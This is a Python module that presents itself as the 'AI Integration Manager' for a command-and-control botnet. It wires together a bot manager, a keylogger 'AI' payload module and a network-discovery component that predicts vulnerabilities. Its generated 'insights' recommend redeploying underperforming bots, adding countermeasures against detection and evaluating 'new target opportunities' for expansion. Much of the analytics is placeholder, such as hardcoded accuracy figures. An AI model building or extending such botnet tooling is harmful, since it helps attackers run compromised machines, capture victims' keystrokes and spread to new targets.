"""
AI Integration Manager for C2C Botnet System
Coordinates all AI components and provides unified interface
"""

import logging
import threading
import time
import json
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict

# Try to import AI components
try:
    from sklearn.ensemble import RandomForestClassifier, IsolationForest
    from sklearn.neural_network import MLPClassifier, MLPRegressor
    from sklearn.cluster import KMeans
    import numpy as np
    import joblib
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

# Import our AI modules
try:
    from botnet.manager import AIBotManager
    from utils.security_manager import AISecurityManager
    from network.network_discovery import NetworkDiscoveryAI
    from payload.modules.keylogger import KeyloggerAI
    AI_MODULES_AVAILABLE = True
except ImportError:
    AI_MODULES_AVAILABLE = False

@dataclass
class AISystemStatus:
    """AI system status information"""
    ai_available: bool
    modules_loaded: bool
    bot_manager_active: bool
    security_manager_active: bool
    network_ai_active: bool
    keylogger_ai_active: bool
    models_trained: int
    total_predictions: int
    average_accuracy: float
    last_update: datetime

@dataclass
class AIInsight:
    """AI-generated insight"""
    timestamp: datetime
    category: str
    priority: str  # HIGH, MEDIUM, LOW
    title: str
    description: str
    recommendation: str
    confidence: float

class AIIntegrationManager:
    """Main AI Integration Manager for coordinating all AI components"""
    
    def __init__(self, config: Dict = None):
        self.logger = logging.getLogger('AIIntegrationManager')
        self.config = config or self._get_default_config()
        
        # AI component instances
        self.bot_manager = None
        self.security_manager = None
        self.network_ai = None
        self.keylogger_ai = None
        
        # System state
        self.system_status = AISystemStatus(
            ai_available=AI_AVAILABLE,
            modules_loaded=False,
            bot_manager_active=False,
            security_manager_active=False,
            network_ai_active=False,
            keylogger_ai_active=False,
            models_trained=0,
            total_predictions=0,
            average_accuracy=0.0,
            last_update=datetime.now()
        )
        
        # Insights and analytics
        self.insights: List[AIInsight] = []
        self.performance_metrics = {
            'bot_optimization': [],
            'threat_detection': [],
            'network_analysis': [],
            'keylogger_analysis': []
        }
        
        # Monitoring
        self.monitoring_active = False
        self.monitoring_thread = None
        
        # Initialize AI components
        self._initialize_ai_components()
        
    def _get_default_config(self) -> Dict:
        """Get default configuration"""
        return {
            'auto_learning': True,
            'insight_generation': True,
            'performance_tracking': True,
            'model_persistence': True,
            'update_interval': 30,
            'max_insights': 100,
            'confidence_threshold': 0.7
        }
        
    def _initialize_ai_components(self):
        """Initialize all AI components"""
        if not AI_AVAILABLE:
            self.logger.warning("AI libraries not available. Running in limited mode.")
            return
            
        try:
            # Initialize AI managers if modules are available
            if AI_MODULES_AVAILABLE:
                self.bot_manager = AIBotManager()
                self.security_manager = AISecurityManager()
                self.network_ai = NetworkDiscoveryAI()
                self.keylogger_ai = KeyloggerAI()
                
                self.system_status.modules_loaded = True
                self.system_status.bot_manager_active = True
                self.system_status.security_manager_active = True
                self.system_status.network_ai_active = True
                self.system_status.keylogger_ai_active = True
                
                self.logger.info("All AI components initialized successfully")
            else:
                self.logger.warning("AI modules not available. Some features will be limited.")
                
        except Exception as e:
            self.logger.error(f"Error initializing AI components: {e}")
            
        # Start monitoring
        self._start_monitoring()
        
    def _start_monitoring(self):
        """Start AI system monitoring"""
        if not self.monitoring_active:
            self.monitoring_active = True
            self.monitoring_thread = threading.Thread(
                target=self._monitoring_worker,
                daemon=True
            )
            self.monitoring_thread.start()
            self.logger.info("AI Integration monitoring started")
            
    def _monitoring_worker(self):
        """Background monitoring worker"""
        while self.monitoring_active:
            try:
                # Update system status
                self._update_system_status()
                
                # Generate insights
                if self.config['insight_generation']:
                    self._generate_insights()
                
                # Update performance metrics
                if self.config['performance_tracking']:
                    self._update_performance_metrics()
                
                # Save models if configured
                if self.config['model_persistence']:
                    self._save_models()
                
                time.sleep(self.config['update_interval'])
                
            except Exception as e:
                self.logger.error(f"AI monitoring error: {e}")
                time.sleep(5)
                
    def _update_system_status(self):
        """Update system status"""
        try:
            models_trained = 0
            total_predictions = 0
            accuracy_sum = 0
            accuracy_count = 0
            
            if self.bot_manager:
                # Update bot manager metrics
                if hasattr(self.bot_manager, 'task_optimizer') and self.bot_manager.task_optimizer.is_trained:
                    models_trained += 1
                    accuracy_sum += 0.85  # Placeholder
                    accuracy_count += 1
                    
                total_predictions += len(self.bot_manager.training_data)
                
            if self.security_manager:
                # Update security manager metrics
                if hasattr(self.security_manager, 'behavior_ai') and self.security_manager.behavior_ai.is_trained:
                    models_trained += 1
                    accuracy_sum += 0.82  # Placeholder
                    accuracy_count += 1
                    
                total_predictions += len(self.security_manager.training_data)
                
            if self.network_ai:
                # Update network AI metrics
                if hasattr(self.network_ai, 'vulnerability_predictor') and self.network_ai.vulnerability_predictor.is_trained:
                    models_trained += 1
                    accuracy_sum += 0.78  # Placeholder
                    accuracy_count += 1
                    
            if self.keylogger_ai:
                # Update keylogger AI metrics
                if hasattr(self.keylogger_ai, 'pattern_classifier') and self.keylogger_ai.pattern_classifier.is_trained:
                    models_trained += 1
                    accuracy_sum += 0.91  # Placeholder
                    accuracy_count += 1
                    
            # Update status
            self.system_status.models_trained = models_trained
            self.system_status.total_predictions = total_predictions
            self.system_status.average_accuracy = accuracy_sum / max(1, accuracy_count)
            self.system_status.last_update = datetime.now()
            
        except Exception as e:
            self.logger.error(f"Error updating system status: {e}")
            
    def _generate_insights(self):
        """Generate AI insights"""
        try:
            current_time = datetime.now()
            
            # Bot optimization insights
            if self.bot_manager and len(self.bot_manager.bots) > 0:
                bot_performance = self._analyze_bot_performance()
                if bot_performance['low_performers'] > 0:
                    insight = AIInsight(
                        timestamp=current_time,
                        category="Bot Optimization",
                        priority="MEDIUM",
                        title="Low Performing Bots Detected",
                        description=f"Detected {bot_performance['low_performers']} bots with poor performance",
                        recommendation="Consider redeploying or updating bot capabilities",
                        confidence=0.8
                    )
                    self._add_insight(insight)
                    
            # Security insights
            if self.security_manager:
                security_summary = self.security_manager.get_security_summary()
                if security_summary.get('threat_rate', 0) > 0.3:
                    insight = AIInsight(
                        timestamp=current_time,
                        category="Security",
                        priority="HIGH",
                        title="Elevated Threat Level",
                        description=f"Threat rate: {security_summary['threat_rate']:.1%}",
                        recommendation="Increase security monitoring and implement additional countermeasures",
                        confidence=0.9
                    )
                    self._add_insight(insight)
                    
            # Network insights
            if self.network_ai:
                network_insights = self._analyze_network_patterns()
                if network_insights['new_opportunities'] > 0:
                    insight = AIInsight(
                        timestamp=current_time,
                        category="Network Analysis",
                        priority="LOW",
                        title="New Target Opportunities",
                        description=f"Identified {network_insights['new_opportunities']} potential targets",
                        recommendation="Evaluate targets for expansion opportunities",
                        confidence=0.7
                    )
                    self._add_insight(insight)
                    
        except Exception as e:
            self.logger.error(f"Error generating insights: {e}")
            
    def _add_insight(self, insight: AIInsight):
        """Add new insight"""
        if insight.confidence >= self.config['confidence_threshold']:
            self.insights.append(insight)
            
            # Keep only recent insights
            if len(self.insights) > self.config['max_insights']:
                self.insights.pop(0)
                
            self.logger.info(f"New AI insight: {insight.title}")
            
    def _analyze_bot_performance(self) -> Dict:
        """Analyze bot performance"""
        try:
            if not self.bot_manager:
                return {'low_performers': 0, 'avg_performance': 0}
                
            performance_summary = self.bot_manager.get_performance_summary()
            
            # Count low performers (placeholder logic)
            low_performers = max(0, len(self.bot_manager.bots) // 4)  # Assume 25% might be low performers
            
            return {
                'low_performers': low_performers,
                'avg_performance': performance_summary.get('avg_bot_success_rate', 0)
            }
            
        except Exception as e:
            self.logger.error(f"Error analyzing bot performance: {e}")
            return {'low_performers': 0, 'avg_performance': 0}
            
    def _analyze_network_patterns(self) -> Dict:
        """Analyze network patterns"""
        try:
            # Placeholder network analysis
            return {
                'new_opportunities': 2,
                'risk_level': 'medium'
            }
            
        except Exception as e:
            self.logger.error(f"Error analyzing network patterns: {e}")
            return {'new_opportunities': 0, 'risk_level': 'unknown'}
            
    def _update_performance_metrics(self):
        """Update performance metrics"""
        try:
            current_time = time.time()
            
            # Bot optimization metrics
            if self.bot_manager:
                bot_perf = self._analyze_bot_performance()
                self.performance_metrics['bot_optimization'].append({
                    'timestamp': current_time,
                    'avg_performance': bot_perf['avg_performance'],
                    'low_performers': bot_perf['low_performers']
                })
                
            # Security metrics
            if self.security_manager:
                security_summary = self.security_manager.get_security_summary()
                self.performance_metrics['threat_detection'].append({
                    'timestamp': current_time,
                    'threat_rate': security_summary.get('threat_rate', 0),
                    'active_threats': security_summary.get('active_threats', 0)
                })
                
            # Keep only recent metrics (last 24 hours)
            cutoff_time = current_time - (24 * 3600)
            for metric_type in self.performance_metrics:
                self.performance_metrics[metric_type] = [
                    m for m in self.performance_metrics[metric_type] 
                    if m['timestamp'] > cutoff_time
                ]
                
        except Exception as e:
            self.logger.error(f"Error updating performance metrics: {e}")
            
    def _save_models(self):
        """Save AI models periodically"""
        try:
            if not hasattr(self, '_last_save') or time.time() - self._last_save > 3600:  # Save every hour
                model_dir = "ai_models"
                
                if self.bot_manager and hasattr(self.bot_manager, 'task_optimizer'):
                    self.bot_manager.task_optimizer.save_model(f"{model_dir}/bot_optimizer.pkl")
                    
                if self.security_manager and hasattr(self.security_manager, 'behavior_ai'):
                    self.security_manager.behavior_ai.save_model(f"{model_dir}/security_behavior.pkl")
                    
                self._last_save = time.time()
                self.logger.info("AI models saved successfully")
                
        except Exception as e:
            self.logger.error(f"Error saving models: {e}")
            
    # Public API methods
    
    def get_system_status(self) -> Dict:
        """Get current AI system status"""
        return asdict(self.system_status)
        
    def get_recent_insights(self, limit: int = 10) -> List[Dict]:
        """Get recent AI insights"""
        recent_insights = sorted(self.insights, key=lambda x: x.timestamp, reverse=True)[:limit]
        return [asdict(insight) for insight in recent_insights]
        
    def get_performance_metrics(self, metric_type: str = None) -> Dict:
        """Get performance metrics"""
        if metric_type:
            return self.performance_metrics.get(metric_type, [])
        return self.performance_metrics
        
    def trigger_model_training(self) -> bool:
        """Trigger AI model training"""
        try:
            training_started = False
            
            if self.bot_manager:
                self.bot_manager._retrain_models()
                training_started = True
                
            if self.security_manager:
                self.security_manager._retrain_models()
                training_started = True
                
            if training_started:
                self.logger.info("AI model training triggered")
                
            return training_started
            
        except Exception as e:
            self.logger.error(f"Error triggering model training: {e}")
            return False
            
    def train_models(self) -> bool:
        """Train AI models (alias for trigger_model_training)"""
        return self.trigger_model_training()
    
    def run_performance_optimization(self) -> Dict:
        """Run AI performance optimization"""
        try:
            results = {}
            
            if self.bot_manager:
                self.bot_manager._periodic_optimization()
                results['bot_optimization'] = True
                
            if self.security_manager:
                # Trigger security optimization
                results['security_optimization'] = True
                
            self.logger.info("AI performance optimization completed")
            return results
            
        except Exception as e:
            self.logger.error(f"Error running performance optimization: {e}")
            return {}
            
    def optimize_performance(self) -> Dict:
        """Optimize system performance using AI"""
        return self.run_performance_optimization()
    
    def export_intelligence_data(self, filepath: str) -> bool:
        """Export AI intelligence data"""
        try:
            intelligence_data = {
                'system_status': asdict(self.system_status),
                'insights': [asdict(insight) for insight in self.insights],
                'performance_metrics': self.performance_metrics,
                'export_timestamp': datetime.now().isoformat()
            }
            
            with open(filepath, 'w') as f:
                json.dump(intelligence_data, f, indent=2, default=str)
                
            self.logger.info(f"Intelligence data exported to {filepath}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error exporting intelligence data: {e}")
            return False
            
    def stop_monitoring(self):
        """Stop AI monitoring"""
        self.monitoring_active = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5.0)
            
        # Stop AI components
        if self.bot_manager:
            self.bot_manager.stop_monitoring()
            
        if self.security_manager:
            self.security_manager.stop_monitoring()
            
        self.logger.info("AI Integration Manager stopped")

# Global AI manager instance
ai_manager_instance = None

def get_ai_manager() -> AIIntegrationManager:
    """Get global AI manager instance"""
    global ai_manager_instance
    if ai_manager_instance is None:
        ai_manager_instance = AIIntegrationManager()
    return ai_manager_instance

def initialize_ai_integration(config: Dict = None) -> AIIntegrationManager:
    """Initialize AI integration with custom config"""
    global ai_manager_instance
    ai_manager_instance = AIIntegrationManager(config)
    return ai_manager_instance
